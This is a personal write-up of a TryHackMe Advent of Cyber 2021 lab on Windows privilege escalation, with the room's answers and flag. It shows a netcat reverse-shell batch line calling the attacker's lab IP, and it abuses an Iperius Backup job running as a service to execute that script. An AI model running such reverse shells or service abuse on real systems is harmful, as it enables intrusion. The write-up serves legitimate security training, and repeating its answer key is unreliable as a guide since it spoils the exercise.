<h1 align="center">Advent of Cyber 3 (2021) - Networking - Day 13 - They Lost The Plan!</h1>
<p align="center"><img width="200px" src="https://github.com/user-attachments/assets/6371db5c-9eec-4f49-bdff-02ec11b425c9"><br>Jun 3, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my 393-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
<br>Access Adevent of Cyber 3 (2021) clicking <a href="https://tryhackme.com/room/adventofcyber3"</a>here.<br><br>
<img width="1000px" src="https://github.com/user-attachments/assets/d91f4783-e3e9-435b-88d7-d518778f70e0"></p>

<br>
<br>

<p>1.1. Complete the username: p.....<br>
<code>pepper</code><br>


- Launched <code>PowerShell</code><br>

- Executed <code>net users</code><br>

![image](https://github.com/user-attachments/assets/57ad735d-d55b-40a7-a986-ee10b4b36140)


<br>

- Executed command <code>systeminfo</code><br>

<br>

![image](https://github.com/user-attachments/assets/c1b96525-8167-451c-aee0-f6ebc880991e)

<br>

1.2. What is the OS version?<br>
<code>10.0.17763 N/A Build 17763</code><br>

- Listed the services running on the system, executing <code>wmic service list</code>.<br>

<br>

![image](https://github.com/user-attachments/assets/886258a6-e828-4fff-98ca-b299b3856daa)

<br>

![image](https://github.com/user-attachments/assets/50f95368-8c15-49d7-9549-b6eed707ed51)

<br>


1.3. What backup service did you find running on the system?<br>
<code>IperiusSvc</code><br>

- Executed <code>wmic service list >> services.txt</code><br>
- Executed <code>Select-String -Path services.txt -Pattern backup</code>.<br>

<br>

![image](https://github.com/user-attachments/assets/1be6672e-74d8-4bfe-a2d0-b41a6bcbcc3c)

<br>


1.4. What is the path of the executable for the backup service you have identified?<br>
<code>C:\Program Files (x86)\Iperius Backup\IperiusService.exe</code><br>


![image](https://github.com/user-attachments/assets/5b6d0c01-0c5b-4439-8414-2e4dbf2378ef)

<br>

1.5. Run the whoami command on the connection you have received on your attacking machine. What user do you have?<br>
<code>the-grinch-hack\thegrinch</code><br>

<br>

1.6. What is the content of the flag.txt file?<br>
<code>THM-736635221</code><br>

- Navigated to <code>THM Attackbox</code> virtual machine.<br>
- Looked at the right upper corner.<br>
- Identified my <code>AttackIP</code>:<code>10.10.72.55</code>.<br>
- Launched <code>Command Prompt</code>. I also practiced executing the command <code>ifconfig</code>, and confirmed my <code>AttackIP</code> in the <code>ens5</code> section. If you are using your own virtual machine, you will find it under <code>tun0</code>.<br>
- Set up a listener using <code>nc -nlvp 1337</code>.<br>
-----------------------------------<br>
- Navigated to <code>Aoc_WinPrivEsc</code> virtual machine related to the <code>TargetIP</code>:<code>10.10.203.205</code>.<br>
- Launched <code>notepad</code>.<br>
- Added content to a <code>notepad</code> file named <code>evil.bat</code>.<br>
- <code>@echo off</code><br>
- <code>C:\Users\McSkidy\Downloads\nc.exe -nv 10.10.72.55 1337 -e cmd.exe</code><br>
- Saved <code>evil.bat</code> in the path <code>C:\Users\McSkidy\Desktop</code>.<br>
- Clicked <code>OK</code>.<br>
-----------------------------------<br>
- Launched <code>Iperius Backup</code> application.<br>
- Clicked <code>Create a New Backup Job</code> in the <code>Items</code> tab.<br>
- Clicked <code>Add/ edit destination folder</code>.<br>
- Clicked <code>Select</code>.<br>
- Chose <code>C:\Users\McSkidy\Documents</code>.<br>
- Clicked <code>OK</code>.<br>
-----------------------------------<br>
- Navigated to the <code>Destinations</code> tabtab.<br>
- Clicked <code>Add/ edit destination folder</code>.<br>
- Clicked <code>Select</code>.<br>
- Chose <code>C:\Users\McSkidy\Desktop</code>.<br>
- Clicked <code>OK</code>.<br>
-----------------------------------<br>
- Navigated to the <code>Other processes</code> tab.<br>
- Toggled <code>Run a program or open external file</code>.<br>
- Clicked <code>Select</code>.<br>
- Chose <code>C:\Users\McSkidy\Desktop\evil.bat</code>.<br>
- Clicked <code>Open</code>.<br>
- Clicked <code>Next</code>.<br>
- Clicked <code>OK</code>.<br>
- A new <code>Backup job</code> was created, named <code>Documents</code>.<br>
- Right-clicked <code>Documents</code>.<br>
- Clicked <code>Run backup as service</code>.<br>
- Clicked <code>Yes</code>.<br>
-----------------------------------<br>
- Navigated to <code>THM Attackbox</code> virtual machine.<br>
- Executed <code>whoami</code>.<br>
- Navigated to <code>c:\Users\thegrinch\Documents</code>.<br>
- Executed <code>type flag.txt</code>.<br>
- Executed <code>type Schedule.txt</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/db433eca-4470-44d7-bb3d-7a6a408ebb35)


<br>

![image](https://github.com/user-attachments/assets/dba0f626-8ecd-4921-b665-a014f1f6574e)


<br>

![image](https://github.com/user-attachments/assets/1600e8f8-8083-4b47-889b-3b77d575eb78)



<br>

<code>@echo off</code><br>
<code>C:\Users\McSkidy\Downloads\nc.exe -nv 10.10.72.55 1337 -e cmd.exe</code><br>

<br>

![image](https://github.com/user-attachments/assets/aa991830-993d-487b-9f24-10a349164011)

<br>

![image](https://github.com/user-attachments/assets/06731c3f-f490-4f05-88d6-8bcb86f71ebe)



<br>

![image](https://github.com/user-attachments/assets/5243f622-8bd7-40e9-b1a9-ef009cc47818)

<br>

![image](https://github.com/user-attachments/assets/a95c32ef-eac2-4843-a6a2-6195fd3ea708)

<br>

![image](https://github.com/user-attachments/assets/b5242ba3-4a26-4f2a-9701-5affc5b8eb9e)

<br>

![image](https://github.com/user-attachments/assets/06a91cea-effa-4629-b79f-f3181193a96f)

<br>

![image](https://github.com/user-attachments/assets/f38cc281-c544-47f8-b3b5-000b1e8f18ba)

<br>


1.7. The Grinch forgot to delete a file where he kept notes about his schedule! Where can we find him at 5:30?<br>
<code>jazzercize</code><br>

<br>

![image](https://github.com/user-attachments/assets/72eb6bde-91c7-4c2d-be87-6993646dd6df)

<br>
<br>

<br>
<br>

<h1 align="center">Challenge in Progress, 60%</h1>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/c8e905ef-e357-4b57-a5a1-8d2eb1e7df5f"></p>
                   
<h1 align="center">My TryHackMe Journey</h1>


<div align="center">

| Date<br>          |  Streak<br>|   All Time<br>Global   |   All Time<br>Brazil |  Monthly<br>Global   |  Monthly<br>Brazil   |  SHOGUN<br>points  |   Rooms<br>completed  |  Badges<br> |
| :---------------: | :--------: | :--------------------: | :------------------: | :------------------: | :------------------: | :----------------: | :-------------------: | :---------: |
| Jun 3, 2025       |     393    |          205ᵗʰ         |            4ᵗʰ       |        5,648ᵗʰ       |           95ᵗʰ        |       105,955      |             762       |    62       |

</div>

<p align="center"> Global All Time: 205ᵗʰ <br><img width="300px" src="https://github.com/user-attachments/assets/098b3c2c-f36e-4d8e-801d-9737842d1284" alt="Your Image Badge"><br>
                                              <img width="1000px" src="https://github.com/user-attachments/assets/a56654c5-8cba-40e2-81e9-61a8850f553e"><br><br>
                   Brazil All Time:   4ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/d95638f5-9949-4d85-8e38-c13046e20ba4"><br><br>
                   Global monthly: 5,648ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/d6a17191-1e9d-49e3-a02a-0c7f94ab67cc"><br><br>
                   Brazil monthly:   95ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/710fdd3c-76f6-402b-871e-cd4a1d66183e"><br><br></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
<br><br>
<h1 align="center">Thank you very much ben, ashu, tryhackme, cmnatic, timtaylor, strategos, umairalizafar, jcfarris, and wesladd for developinng this experience so that I could sharpen my skills!</h1>
